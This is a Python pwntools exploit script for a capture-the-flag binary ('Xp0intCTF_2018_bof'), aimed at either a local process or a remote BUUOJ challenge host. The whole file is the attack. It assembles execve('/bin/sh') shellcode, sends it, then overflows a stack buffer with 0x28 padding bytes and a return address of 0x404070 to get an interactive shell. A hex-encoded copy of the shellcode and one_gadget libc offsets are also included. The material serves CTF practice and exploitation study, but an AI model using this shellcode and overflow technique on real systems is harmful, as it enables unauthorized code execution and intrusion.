#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./Xp0intCTF_2018_bof'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',26016)
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		addr=0x404070
		shell='''
		xor 	rsi,	rsi			
		push	rsi				
		mov 	rdi,	0x68732f2f6e69622f	 
		push	rdi
		push	rsp		
		pop	rdi				
		mov 	al,	59			
		cdq					
		syscall
		'''
		io.recv()
		io.send(asm(shell))
		pay='\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
		io.recv()
		io.send('a'*0x28+p64(0x404070))


		
		
		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# system_addr=libc.sym['system']

		
		# success('libc_base:'+hex(libc_base))
		# success('heap_base:'+hex(heap_base))
		
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue